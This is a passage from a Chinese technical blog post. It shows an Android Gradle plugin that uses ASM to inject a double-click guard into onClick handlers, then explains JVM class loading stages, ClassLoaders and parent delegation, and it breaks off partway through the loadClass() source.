class="token operator">:</span> Plugin<span class="token operator">&lt;</span>Project<span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">apply</span><span class="token punctuation">(</span>project<span class="token operator">:</span> Project<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">val</span> config <span class="token operator">=</span> <span class="token function">DoubleClickConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">val</span> appExtension<span class="token operator">:</span> AppExtension <span class="token operator">=</span> project<span class="token punctuation">.</span>extensions<span class="token punctuation">.</span><span class="token function">getByType</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        appExtension<span class="token punctuation">.</span><span class="token function">registerTransform</span><span class="token punctuation">(</span><span class="token function">DoubleClickTransform</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中apply是在你导入这个插件时执行的逻辑，我们在apply方法中注册了我们写的Transform，在编译时便会执行Transform的对应逻辑。</p><p>然后我们只需要在需要使用这个插件的模块导入并apply就可以了</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"><span class="token keyword">import</span> github<span class="token punctuation">.</span>leavesczy<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>doubleClick<span class="token punctuation">.</span>DoubleClickPluginapply plugin<span class="token punctuation">:</span> DoubleClickPlugin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h6 id="transform逻辑"><a href="#transform逻辑" class="headerlink" title="transform逻辑"></a>transform逻辑</h6><p>我们先来看看<code>DoubleClickTransform</code>中的内容</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> <span class="token function">DoubleClickTransform</span><span class="token punctuation">(</span><span class="token keyword">private</span> <span class="token keyword">val</span> config<span class="token operator">:</span> DoubleClickConfig<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">BaseTransform</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">companion</span> <span class="token keyword">object</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">const</span> <span class="token keyword">val</span> ViewDescriptor <span class="token operator">=</span> <span class="token string">"Landroid/view/View;"</span>        <span class="token keyword">private</span> <span class="token keyword">const</span> <span class="token keyword">val</span> OnClickViewMethodDescriptor <span class="token operator">=</span> <span class="token string">"(Landroid/view/View;)V"</span>        <span class="token keyword">private</span> <span class="token keyword">const</span> <span class="token keyword">val</span> ButterKnifeOnClickAnnotationDesc <span class="token operator">=</span> <span class="token string">"Lbutterknife/OnClick;"</span>        <span class="token keyword">private</span> <span class="token keyword">val</span> MethodNode<span class="token punctuation">.</span>onlyOneViewParameter<span class="token operator">:</span> Boolean            <span class="token keyword">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> desc <span class="token operator">==</span> OnClickViewMethodDescriptor        <span class="token keyword">private</span> <span class="token keyword">fun</span> MethodNode<span class="token punctuation">.</span><span class="token function">hasCheckViewAnnotation</span><span class="token punctuation">(</span>config<span class="token operator">:</span> DoubleClickConfig<span class="token punctuation">)</span><span class="token operator">:</span> Boolean <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">hasAnnotation</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>formatCheckViewOnClickAnnotation<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">fun</span> MethodNode<span class="token punctuation">.</span><span class="token function">hasUncheckViewOnClickAnnotation</span><span class="token punctuation">(</span>config<span class="token operator">:</span> DoubleClickConfig<span class="token punctuation">)</span><span class="token operator">:</span> Boolean <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">hasAnnotation</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>formatUncheckViewOnClickAnnotation<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">fun</span> MethodNode<span class="token punctuation">.</span><span class="token function">hasButterKnifeOnClickAnnotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Boolean <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">hasAnnotation</span><span class="token punctuation">(</span>ButterKnifeOnClickAnnotationDesc<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">modifyClass</span><span class="token punctuation">(</span>byteArray<span class="token operator">:</span> ByteArray<span class="token punctuation">)</span><span class="token operator">:</span> ByteArray <span class="token punctuation">{</span>        <span class="token keyword">val</span> classReader <span class="token operator">=</span> <span class="token function">ClassReader</span><span class="token punctuation">(</span>byteArray<span class="token punctuation">)</span>        <span class="token keyword">val</span> classNode <span class="token operator">=</span> <span class="token function">ClassNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        classReader<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>classNode<span class="token punctuation">,</span> ClassReader<span class="token punctuation">.</span>EXPAND_FRAMES<span class="token punctuation">)</span>        <span class="token keyword">val</span> methods <span class="token operator">=</span> classNode<span class="token punctuation">.</span>methods        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>methods<span class="token punctuation">.</span><span class="token function">isNullOrEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">val</span> shouldHookMethodList <span class="token operator">=</span> mutableSetOf<span class="token operator">&lt;</span>String<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>methodNode <span class="token keyword">in</span> methods<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment">//静态、包含 UncheckViewOnClick 注解的方法不用处理</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>methodNode<span class="token punctuation">.</span>isStatic <span class="token operator">||</span>                    methodNode<span class="token punctuation">.</span><span class="token function">hasUncheckViewOnClickAnnotation</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>                <span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">continue</span>                <span class="token punctuation">}</span>                <span class="token keyword">val</span> methodNameWithDesc <span class="token operator">=</span> methodNode<span class="token punctuation">.</span>nameWithDesc                <span class="token keyword">if</span> <span class="token punctuation">(</span>methodNode<span class="token punctuation">.</span>onlyOneViewParameter<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>methodNode<span class="token punctuation">.</span><span class="token function">hasCheckViewAnnotation</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment">//添加了 CheckViewOnClick 注解的情况</span>                        shouldHookMethodList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>methodNameWithDesc<span class="token punctuation">)</span>                        <span class="token keyword">continue</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>methodNode<span class="token punctuation">.</span><span class="token function">hasButterKnifeOnClickAnnotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment">//使用了 ButterKnife，且当前 method 添加了 OnClick 注解</span>                        shouldHookMethodList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>methodNameWithDesc<span class="token punctuation">)</span>                        <span class="token keyword">continue</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>classNode<span class="token punctuation">.</span><span class="token function">isHookPoint</span><span class="token punctuation">(</span>config<span class="token punctuation">,</span> methodNode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    shouldHookMethodList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>methodNameWithDesc<span class="token punctuation">)</span>                    <span class="token keyword">continue</span>                <span class="token punctuation">}</span>                <span class="token comment">//判断方法内部是否有需要处理的 lambda 表达式</span>                <span class="token keyword">val</span> invokeDynamicInsnNodes <span class="token operator">=</span> methodNode<span class="token punctuation">.</span><span class="token function">findHookPointLambda</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>                invokeDynamicInsnNodes<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span>                    <span class="token keyword">val</span> handle <span class="token operator">=</span> it<span class="token punctuation">.</span>bsmArgs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span><span class="token operator">?</span> Handle                    <span class="token keyword">if</span> <span class="token punctuation">(</span>handle <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        shouldHookMethodList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>handle<span class="token punctuation">.</span>name <span class="token operator">+</span> handle<span class="token punctuation">.</span>desc<span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>shouldHookMethodList<span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>methodNode <span class="token keyword">in</span> methods<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">val</span> methodNameWithDesc <span class="token operator">=</span> methodNode<span class="token punctuation">.</span>nameWithDesc                    <span class="token keyword">if</span> <span class="token punctuation">(</span>shouldHookMethodList<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>methodNameWithDesc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">val</span> argumentTypes <span class="token operator">=</span> Type<span class="token punctuation">.</span><span class="token function">getArgumentTypes</span><span class="token punctuation">(</span>methodNode<span class="token punctuation">.</span>desc<span class="token punctuation">)</span>                        <span class="token keyword">val</span> viewArgumentIndex <span class="token operator">=</span> argumentTypes<span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">indexOfFirst</span> <span class="token punctuation">{</span>                            it<span class="token punctuation">.</span>descriptor <span class="token operator">==</span> ViewDescriptor                        <span class="token punctuation">}</span> <span class="token operator">?:</span> <span class="token operator">-</span><span class="token number">1</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>viewArgumentIndex <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">val</span> instructions <span class="token operator">=</span> methodNode<span class="token punctuation">.</span>instructions                            <span class="token keyword">if</span> <span class="token punctuation">(</span>instructions <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> instructions<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">val</span> list <span class="token operator">=</span> <span class="token function">InsnList</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>                                    <span class="token function">VarInsnNode</span><span class="token punctuation">(</span>                                        Opcodes<span class="token punctuation">.</span>ALOAD<span class="token punctuation">,</span> <span class="token function">getVisitPosition</span><span class="token punctuation">(</span>                                            argumentTypes<span class="token punctuation">,</span>                                            viewArgumentIndex<span class="token punctuation">,</span>                                            methodNode<span class="token punctuation">.</span>isStatic                                        <span class="token punctuation">)</span>                                    <span class="token punctuation">)</span>                                <span class="token punctuation">)</span>                                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>                                    <span class="token function">MethodInsnNode</span><span class="token punctuation">(</span>                                        Opcodes<span class="token punctuation">.</span>INVOKESTATIC<span class="token punctuation">,</span>                                        config<span class="token punctuation">.</span>formatDoubleCheckClass<span class="token punctuation">,</span>                                        config<span class="token punctuation">.</span>doubleCheckMethodName<span class="token punctuation">,</span>                                        config<span class="token punctuation">.</span>doubleCheckMethodDescriptor                                    <span class="token punctuation">)</span>                                <span class="token punctuation">)</span>                                <span class="token keyword">val</span> labelNode <span class="token operator">=</span> <span class="token function">LabelNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">JumpInsnNode</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>IFNE<span class="token punctuation">,</span> labelNode<span class="token punctuation">)</span><span class="token punctuation">)</span>                                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">InsnNode</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>RETURN<span class="token punctuation">)</span><span class="token punctuation">)</span>                                list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>labelNode<span class="token punctuation">)</span>                                instructions<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">val</span> classWriter <span class="token operator">=</span> <span class="token function">ClassWriter</span><span class="token punctuation">(</span>ClassWriter<span class="token punctuation">.</span>COMPUTE_MAXS<span class="token punctuation">)</span>                classNode<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>classWriter<span class="token punctuation">)</span>                <span class="token keyword">return</span> classWriter<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> byteArray    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">fun</span> ClassNode<span class="token punctuation">.</span><span class="token function">isHookPoint</span><span class="token punctuation">(</span>config<span class="token operator">:</span> DoubleClickConfig<span class="token punctuation">,</span> methodNode<span class="token operator">:</span> MethodNode<span class="token punctuation">)</span><span class="token operator">:</span> Boolean <span class="token punctuation">{</span>        <span class="token keyword">val</span> myInterfaces <span class="token operator">=</span> interfaces        <span class="token keyword">if</span> <span class="token punctuation">(</span>myInterfaces<span class="token punctuation">.</span><span class="token function">isNullOrEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span>        <span class="token punctuation">}</span>        <span class="token keyword">val</span> extraHookMethodList <span class="token operator">=</span> config<span class="token punctuation">.</span>hookPointList        extraHookMethodList<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>myInterfaces<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>it<span class="token punctuation">.</span>interfaceName<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> methodNode<span class="token punctuation">.</span>nameWithDesc <span class="token operator">==</span> it<span class="token punctuation">.</span>methodSign<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">fun</span> MethodNode<span class="token punctuation">.</span><span class="token function">findHookPointLambda</span><span class="token punctuation">(</span>config<span class="token operator">:</span> DoubleClickConfig<span class="token punctuation">)</span><span class="token operator">:</span> List<span class="token operator">&lt;</span>InvokeDynamicInsnNode<span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">val</span> onClickListenerLambda <span class="token operator">=</span> findLambda <span class="token punctuation">{</span>            <span class="token keyword">val</span> nodeName <span class="token operator">=</span> it<span class="token punctuation">.</span>name            <span class="token keyword">val</span> nodeDesc <span class="token operator">=</span> it<span class="token punctuation">.</span>desc            <span class="token keyword">val</span> find <span class="token operator">=</span> config<span class="token punctuation">.</span>hookPointList<span class="token punctuation">.</span><span class="token function">find</span> <span class="token punctuation">{</span> point <span class="token operator">-&gt;</span>                nodeName <span class="token operator">==</span> point<span class="token punctuation">.</span>methodName <span class="token operator">&amp;&amp;</span> nodeDesc<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span>point<span class="token punctuation">.</span>interfaceSignSuffix<span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span><span class="token label symbol">@findLambda</span> find <span class="token operator">!=</span> <span class="token keyword">null</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> onClickListenerLambda    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">getInputTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Set<span class="token operator">&lt;</span>QualifiedContent<span class="token punctuation">.</span>ContentType<span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> TransformManager<span class="token punctuation">.</span>CONTENT_CLASS    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">getScopes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> MutableSet<span class="token operator">&lt;</span><span class="token keyword">in</span> QualifiedContent<span class="token punctuation">.</span>Scope<span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">mutableSetOf</span><span class="token punctuation">(</span>            QualifiedContent<span class="token punctuation">.</span>Scope<span class="token punctuation">.</span>PROJECT<span class="token punctuation">,</span>            QualifiedContent<span class="token punctuation">.</span>Scope<span class="token punctuation">.</span>SUB_PROJECTS<span class="token punctuation">,</span><span class="token comment">//            QualifiedContent.Scope.EXTERNAL_LIBRARIES</span>        <span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>他自己封装了一个<code>BaseTransform</code>，把修改class的过程封装成了一个<code>modifierClass(byteArray: ByteArray): ByteArray</code>方法，让我们能更专注于修改类信息的过程。至于他是怎么封装的也可以课下了解，这里我们着重讲他如何使用asm。</p><p>我们首先分析他的逻辑，无外乎两点：</p><ul><li>找到hook点（ButterKnife的onClick注解，View#setOnClickListener）</li><li>在hook点插入逻辑代码</li></ul><blockquote><p>这里自由发挥吧，随便讲点就差不多了。</p></blockquote><h2 id="虚拟机类加载机制"><a href="#虚拟机类加载机制" class="headerlink" title="虚拟机类加载机制"></a>虚拟机类加载机制</h2><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/13202633-3cb11d1712a9efc9.webp" alt="13202633-3cb11d1712a9efc9"></p><h3 id="类的生命周期"><a href="#类的生命周期" class="headerlink" title="类的生命周期"></a>类的生命周期</h3><h4 id="加载-Loading"><a href="#加载-Loading" class="headerlink" title="加载 Loading"></a>加载 Loading</h4><blockquote><p>虚拟机从io流读取类文件到内存中。</p><p>加载过程主要完成三件事情：</p><ol><li>通过类的全限定名来获取定义此类的二进制字节流</li><li>将这个类字节流代表的静态存储结构转为方法区的运行时数据结构</li><li>在堆中生成一个代表此类的java.lang.Class对象，作为访问方法区这些数据结构的入口。</li></ol><p>这个过程主要就是类加载器完成。</p></blockquote><h4 id="验证-Verification"><a href="#验证-Verification" class="headerlink" title="验证 Verification"></a>验证 Verification</h4><blockquote><p>此阶段主要确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机的自身安全。</p><ol><li>文件格式验证：基于字节流验证。</li><li>元数据验证：基于<em><strong>方法区</strong></em>的存储结构验证。</li><li>字节码验证：基于方法区的存储结构验证。</li><li>符号引用验证：基于方法区的存储结构验证。</li></ol></blockquote><h4 id="准备-Preparation"><a href="#准备-Preparation" class="headerlink" title="准备 Preparation"></a>准备 Preparation</h4><blockquote><p>为类变量分配内存，并将其初始化为默认值。（此时为默认值，在初始化的时候才会给变量赋值）即在方法区中分配这些变量所使用的内存空间</p></blockquote><p>例如</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> value <span class="token operator">=</span> <span class="token number">12345</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>虽说value在代码中被初始化为5，但这时value的值仍然为0，变量要在初始化阶段才会被赋初值（如果有）。</p><h4 id="解析-Resolution"><a href="#解析-Resolution" class="headerlink" title="解析 Resolution"></a>解析 Resolution</h4><blockquote><p>把类型中的符号引用转换为直接引用。</p><ul><li>符号引用与虚拟机实现的布局无关，引用的目标并不一定要已经加载到内存中。各种虚拟机实现的内存布局可以各不相同，但是它们能接受的符号引用必须是一致的，因为符号引用的字面量形式明确定义在Java虚拟机规范的Class文件格式中。</li><li>直接引用可以是指向目标的指针，相对偏移量或是一个能间接定位到目标的句柄。如果有了直接引用，那引用的目标必定已经在内存中存在</li></ul><p>主要有以下四种：</p><ul><li><p>类或接口的解析</p></li><li><p>字段解析</p></li><li><p>类方法解析</p></li><li><p>接口方法解析</p></li></ul></blockquote><h4 id="初始化-Initialization"><a href="#初始化-Initialization" class="headerlink" title="初始化 Initialization"></a>初始化 Initialization</h4><blockquote><p>初始化阶段是执行类构造器<client>方法的过程。<client>方法是由编译器自动收集类中的类变量的赋值操作和静态语句块中的语句合并而成的。虚拟机会保证<client>方法执行之前，父类的<client>方法已经执行完毕。如果一个类中没有对静态变量赋值也没有静态语句块，那么编译器可以不为这个类生成<client>()方法。</client></client></client></client></client></p><p>java中，对于初始化阶段，有且只有以下五种情况才会对要求类立刻“初始化”（加载，验证，准备，自然需要在此之前开始）：</p><ul><li><p>使用new关键字实例化对象、访问或者设置一个类的静态字段（被final修饰、编译器优化时已经放入常量池的例外）、调用类方法，都会初始化该静态字段或者静态方法所在的类。</p></li><li><p>初始化类的时候，如果其父类没有被初始化过，则要先触发其父类初始化。</p></li><li><p>使用java.lang.reflect包的方法进行反射调用的时候，如果类没有被初始化，则要先初始化。</p></li><li><p>虚拟机启动时，用户会先初始化要执行的主类（含有main）</p></li><li><p>jdk 1.7后，如果java.lang.invoke.MethodHandle的实例最后对应的解析结果是 REF_getStatic、REF_putStatic、REF_invokeStatic方法句柄，并且这个方法所在类没有初始化，则先初始化。</p></li></ul></blockquote><h4 id="卸载-Unloading"><a href="#卸载-Unloading" class="headerlink" title="卸载 Unloading"></a>卸载 Unloading</h4><blockquote><p>在栈中不存在该类的实例与Class对象，且加载该类的classLoader失去gc roots时，换言之该类已经失去了gc roots，被gc回收，此时可以称作该类成功从jvm中卸载了，这条机制也是一些热修复方案的实现原理(其实现在大部分的热修复都是用JavaAgent实现类的热替换）。</p></blockquote><h3 id="类加载器-ClassLoader"><a href="#类加载器-ClassLoader" class="headerlink" title="类加载器 (ClassLoader)"></a>类加载器 (ClassLoader)</h3><h4 id="各司其职"><a href="#各司其职" class="headerlink" title="各司其职"></a>各司其职</h4><p>JVM 运行实例中会存在多个 ClassLoader，不同的 ClassLoader 会从不同的地方加载字节码文件。它可以从不同的文件目录加载，也可以从不同的 jar 文件中加载，也可以从网络上不同的服务地址来加载。</p><p>JVM 中内置了三个重要的 ClassLoader，分别是 BootstrapClassLoader、ExtensionClassLoader 和 AppClassLoader。</p><p>BootstrapClassLoader 负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.xxx.* 都在里面，比如 java.util.*、java.io.*、java.nio.<em>、java.lang.</em> 等等。这个 ClassLoader 比较特殊，它是由 C 代码实现的，我们将它称之为「根加载器」。</p><p>ExtensionClassLoader 负责加载 JVM 扩展类，比如 swing 系列、内置的 js 引擎、xml 解析器 等等，这些库名通常以 javax 开头，它们的 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，有很多 jar 包。</p><p>AppClassLoader 才是直接面向我们用户的加载器，它会加载 Classpath 环境变量里定义的路径中的 jar 包和目录。我们自己编写的代码以及使用的第三方 jar 包通常都是由它来加载的。</p><p>那些位于网络上静态文件服务器提供的 jar 包和 class文件，jdk 内置了一个 URLClassLoader，用户只需要传递规范的网络路径给构造器，就可以使用 URLClassLoader 来加载远程类库了。URLClassLoader 不但可以加载远程类库，还可以加载本地路径的类库，取决于构造器中不同的地址形式。ExtensionClassLoader 和 AppClassLoader 都是 URLClassLoader 的子类，它们都是从本地文件系统里加载类库。</p><p>AppClassLoader 可以由 ClassLoader 类提供的静态方法 getSystemClassLoader() 得到，它就是我们所说的「系统类加载器」，我们用户平时编写的类代码通常都是由它加载的。当我们的 main 方法执行的时候，这第一个用户类的加载器就是 AppClassLoader。</p><h4 id="ClassLoader-传递性"><a href="#ClassLoader-传递性" class="headerlink" title="ClassLoader 传递性"></a>ClassLoader 传递性</h4><p>程序在运行过程中，遇到了一个未知的类，它会选择哪个 ClassLoader 来加载它呢？虚拟机的策略是使用调用者 Class 对象的 ClassLoader 来加载当前未知的类。何为调用者 Class 对象？就是在遇到这个未知的类时，虚拟机肯定正在运行一个方法调用（静态方法或者实例方法），这个方法挂在哪个类上面，那这个类就是调用者 Class 对象。前面我们提到每个 Class 对象里面都有一个 classLoader 属性记录了当前的类是由谁来加载的。</p><p>因为 ClassLoader 的传递性，所有延迟加载的类都会由初始调用 main 方法的这个 ClassLoader 全全负责，它就是 AppClassLoader。</p><h4 id="双亲委派"><a href="#双亲委派" class="headerlink" title="双亲委派"></a>双亲委派</h4><p>双亲委派模型的工作过程为：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。</p><p>使用双亲委派模型的好处在于<strong>Java类随着它的类加载器一起具备了一种带有优先级的层次关系</strong>。例如类java.lang.Object，它存在在rt.jar中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的Bootstrap ClassLoader进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。相反，如果没有双亲委派模型而是由各个类加载器自行加载的话，如果用户编写了一个java.lang.Object的同名类并放在ClassPath中，那系统中将会出现多个不同的Object类，程序将混乱。因此，如果开发者尝试编写一个与rt.jar类库中重名的Java类，可以正常编译，但是永远无法被加载运行。</p><p><img src="https://img-blog.csdn.net/20160506184936657" alt="类加载器的双亲委派模型"></p><p><strong>双亲委派模型的系统实现</strong></p><p>在java.lang.ClassLoader的loadClass()方法中，先检查是否已经被加载过，若没有加载则调用父类加载器的loadClass()方法，若父加载器为空则默认使用启动类加载器作为父加载器。如果父加载失败，则抛出ClassNotFoundException异常后，再调用自己的findClass()方法进行加载。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">synchronized</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> <span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">boolean</span> resolve<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">{</span>    <span class="token comment">//check the class has been loaded or not</span>    <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>parent <span class="token operator">!=</span> 